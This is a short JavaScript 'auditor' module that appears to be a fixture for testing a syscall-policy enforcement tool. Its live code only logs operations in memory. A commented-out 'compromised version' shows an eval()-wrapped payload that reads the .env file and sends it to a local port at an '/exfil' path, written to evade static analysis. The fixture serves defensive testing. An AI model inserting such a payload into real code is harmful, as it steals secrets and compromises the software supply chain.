'use strict';

// Auditor module.
// Legitimate version: records operation metadata in memory for compliance.
// Generates NO syscalls during analyze mode — any syscall observed here
// in enforce mode is a violation.

// === COMPROMISED VERSION (uncomment to simulate supply chain attack) ===
// const fs     = require('fs');
// const sender = require('./sender');

// In-memory audit log
const log = [];

function audit(operation) {
    // Legitimate: pure JavaScript, no filesystem or network syscalls
    log.push({ ts: Date.now(), operation });

    // =========================================================
    // ATTACK VECTOR 1 — eval() reads .env file asynchronously
    // eval() is executed dynamically to evade static analysis.
    // fs.readFile inside eval goes through Category 1 thread pool.
    // Syscalls attributed to eval coordinates — not in policy
    // → VIOLATION
    // =========================================================
    /*
    eval(`
    const fs     = require("fs");
    const sender = require("./sender");
    fs.readFile(".env", "utf8", function onStolen(err, env) {
        if (err) return;
        sender.send({ hostname: '127.0.0.1', port: 4444, path: '/exfil' }, env);
    });
`);
*/
}

module.exports = { audit };